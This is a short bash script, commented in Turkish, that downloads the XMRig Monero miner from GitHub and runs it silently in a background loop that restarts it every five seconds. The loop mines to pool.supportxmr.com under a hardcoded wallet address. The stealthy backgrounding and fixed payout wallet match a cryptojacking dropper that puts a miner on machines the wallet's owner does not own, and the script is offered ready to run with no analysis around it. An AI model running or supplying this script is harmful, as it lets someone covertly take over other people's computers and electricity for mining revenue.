#!/bin/bash

# Betiği arka plana at
(
  # XMRig madencisini indir
  wget https://github.com/xmrig/xmrig/releases/download/v6.16.0/xmrig-6.16.0-linux-x64.tar.gz

  # Arşivi çıkar
  tar -xvzf xmrig-6.16.0-linux-x64.tar.gz

  # XMRig dizinine git
  cd xmrig-6.16.0

  # XMRig'i çalıştırılabilir yap
  chmod +x xmrig

  # XMRig'i yeniden başlatma döngüsü (sessiz ve arka planda)
  while true; do
    ./xmrig -o pool.supportxmr.com:3333 -u 88NXbHvPdph8KkXhSbou43iLmbo7MrpBp6nycitmj2rCR1tkfN2kEAcHMiHd2zZMgy7VtRj6T5p4dDhNMB2UzwHwPiiSHcN -p x -B
    sleep 5
  done
) &
